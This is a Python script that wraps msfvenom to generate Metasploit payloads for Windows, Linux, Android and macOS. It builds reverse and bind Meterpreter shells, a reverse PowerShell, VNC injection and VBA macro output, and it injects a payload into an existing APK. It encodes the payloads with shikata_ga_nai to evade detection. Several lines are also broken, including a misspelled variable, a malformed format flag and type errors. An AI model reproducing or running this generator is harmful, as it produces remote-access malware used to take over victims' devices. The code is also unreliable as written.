import subprocess
import os

def windows(namder):
    if namder == 1:
        port = int(input('lport: '))
        directory = str(input('dir: '))
        b = list(directory)
        if b[-1] != '/':
            directory += '/'
        name = str(input('name_file: '))

        subprocess.check_output(
            f'msfvenom -p windows/meterpreter/bind_tcp lport={port} -e x86/shikata_ga_nai -i 5 -f exe > {directory}{name}.exe', shell=True)
    
    elif (namder == 2) or (namder == 4) or (namder == 5) or (namder == 7) or (namder == 8):
        host = str(input('lhost: '))
        port = int(input('lport: '))
        directory = str(input('dir: '))
        b = list(directory)
        if b[-1] != '/':
            directory += '/'
        name = str(input('name_file: '))

        if namder == 2:
            subprocess.check_output(
                f'msfvenom -p windows/meterpreter/reverse_tcp lhost={host} lport={port} -e x86/shikata_ga_nai -i 5 -f exe > {directory}{name}.exe', shell=True)
        elif namder == 4:
            subprocess.check_output(
                f'msfvenom -p windows/shell_hidden_bind_tcp ahost={host} lport={port} -e x86/shikata_ga_nai -i 5 -f exe > {directory}{name}.exe', shell=True)
        elif namder == 5:
            subprocess.check_output(
                f'msfvenom -p windows/shell_reverse_tcp ahost={host} lport={port} -e x86/shikata_ga_nai -i 5 -f exe > {directory}{name}.exe', shell=True)
        elif namder == 7:
            subprocess.check_output(
                f'msfvenom -p windows/vncinject/reverse_tcp lhost={host} lport={port} -e x86/shikata_ga_nai -i 5 -f exe > {directory}{name}.exe', shell=True)
        elif namder == 8:
            subprocess.check_output(
                f'msfvenom -p cmd/windows/reverse_powershell lhost={host} lport={port} -e x86/shikata_ga_nai -i 5 > {directory}{name}.bat', shell=True)
    
    elif namder == 3:
        host = str(input('lhost: '))
        directory = str(input('dir: '))
        b = list(directory)
        if b[-1] != '/':
            directory += '/'
        name = str(input('name_file: '))

        subprocess.check_output(
            f'msfvenom -p windows/meterpreter/reverse_https lhost={host} lport=443 -e x86/shikata_ga_nai -i 5 -f exe > {directiry}{name}.exe', shell=True)
    
    elif namder == 6:
        host = str(input('lhost: '))
        port = int(input('lport: '))

        subprocess.call(
            f'msfvenom -p windows/meterpreter/reverse_tcp lhost={host} lport={port} -e x86/shikata_ga_nai -i 5 -f vba', shell=True)
    
    else:
        print('\nError')

def linux(namder):
    if (namder == 1) or (namder == 2):
        host = str(input('lhost: '))
        port = int(input('lport: '))
        directory = str(input('dir: '))
        b = list(directory)
        if b[-1] != '/':
            directory += '/'
        name = str(input('name_file: '))

        if namder == 1:
            subprocess.check_output(
                f'msfvenom -p linux/x86/meterpreter/reverse_tcp lhost={host} lport={port} -e x86/shikata_ga_nai -i 5 -f elf > {directory}{name}', shell=True)
        elif namder == 2:
            subprocess.check_output(
                f'msfvenom -p python/meterpreter/reverse_tcp lhost={host} lport={port} -e x86/shikata_ga_nai -i 5 -f py > {directory}{name}.py', shell=True)
    
    elif namder == 3:
        port = int(input('lport: '))
        directory = str(input('dir: '))
        b = list(directory)
        if b[-1] != '/':
            directory += '/'
        name = str(input('name_file: '))

        subprocess.check_output(
            f'msfvenom -p linux/x86/meterpreter/bind_tcp lport={port} -e x86/shikata_ga_nai -i 5 - f elf > {directory}{name}', shell=True)
    
    else:
        print('\nError')


def android(namder):
    if namder == 1:
        host = str(input('lhost: '))
        port = int(input('lport: '))
        directory = str(input('dir: '))
        b = list(directory)
        if b[-1] != '/':
            directory += '/'
        name = str(input('name_file: '))

        subprocess.check_output(
            f'msfvenom -p android/meterpreter/reverse_tcp lhost={host} lport={port} > {directory}{name}.apk', shell=True)
    
    elif namder == 2:
        host = str(input('lhost: '))
        port = str(input('lport: '))
        directory = str(input('Original apk: '))

        print('apk create: tools/evilapk/')

        with open('tools/host.txt', 'wb') as file:
            file.write(host)
        
        with open('tools/port.txt', 'wb') as file:
            file.write(port)
        
        with open('tools/dir_apk.txt', 'wb') as file:
            file.write(directory)
        
        os.system('./tools/apk.sh')
    
    else:
        print('\nError')

        

def mac(namder):
    if namder == 1:
        host = str(input('lhost: '))
        port = int(input('lport: '))
        directory = str(input('dir: '))
        b = list(directory)
        if b[-1] != '/':
            directory += '/'
        name = str(input('name_file: '))

        subprocess.check_output(
            f'msfvenom -p osx/x64/meterpreter/reverse_tcp lhost={host} lport={port} -e x86/shikata_ga_nai -i 5 -f macho > {directory}{name}.macho')
    
    elif namder == 2:
        port = int(input('lport: '))
        directory = str(input('dir: '))
        b = list(directory)
        if b[-1] != '/':
            directory += '/'
        name = str(input('name_file: '))
        
        subprocess.check_output(
            f'msfvenom -p osx/x64/meterpreter/bind_tcp lport={port} -e x86/shikata_ga_nai -i 5 -f macho > {directory}{name}.macho')
    
    else:
        print('\nError')
